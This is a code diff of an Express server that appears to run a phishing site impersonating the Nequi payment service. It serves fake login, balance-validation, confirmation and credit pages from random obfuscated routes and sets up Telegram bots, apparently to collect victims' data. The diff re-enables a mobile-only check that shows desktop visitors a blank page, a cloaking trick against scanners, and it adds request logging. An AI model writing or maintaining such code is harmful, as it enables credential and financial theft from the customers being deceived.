@@ -12,6 +12,13 @@ const CHAT_ID = '-5102063644'; // ID corregido por el usuario
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Log every request aggressively
+app.use((req, res, next) => {
+    const logMsg = `\n>>> [${new Date().toISOString()}] ${req.method} ${req.url}\n`;
+    process.stdout.write(logMsg);
+    next();
+});
+
 // Random Routes Mapping
 const ROUTES = {
     INDEX: '/dGtRYXVHejZ6TXo4UHpiSTgyWENocGFRQVJXNElpcEtyZHdKVER4TWpqQzRDS2xrSDNkbDRZdDE3NzA5OTAyMjkzOTE',
@@ -24,20 +31,18 @@ const ROUTES = {
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(__dirname)); // Move this to the top to serve assets correctly
+
+// Serve static assets with logging
+app.use(express.static(path.join(process.cwd()))); 
 
 // Middleware for Mobile Detection
 const mobileCheck = (req, res, next) => {
     const ua = req.headers['user-agent'];
-    // Allow visualization in Trae (Temporarily for debugging)
-    next();
-    /*
     if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
         next();
     } else {
         res.send(''); // Send empty response (blank screen)
     }
-    */
 };
 
 // Initialize Telegram Bots
@@ -72,23 +77,23 @@ app.get('/api/notify-visitor', (req, res) => {
 
 // Serve specific HTML files on random routes (Mobile Only)
 app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(process.cwd(), 'index.html'));
 });
 
 app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
-    res.sendFile(path.join(__dirname, 'login_final.html'));
+    res.sendFile(path.join(process.cwd(), 'login_final.html'));
 });
 
 app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
-    res.sendFile(path.join(__dirname, 'validacion_saldo.html'));
+    res.sendFile(path.join(process.cwd(), 'validacion_saldo.html'));
 });
 
 app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
-    res.sendFile(path.join(__dirname, 'confirmacion_nequi.html'));
+    res.sendFile(path.join(process.cwd(), 'confirmacion_nequi.html'));
 });
 
 app.get(ROUTES.CREDIT, mobileCheck, (req, res) => {
-    res.sendFile(path.join(__dirname, 'credito.html'));
+    res.sendFile(path.join(process.cwd(), 'credito.html'));
 });
 
 // Root redirect to random index
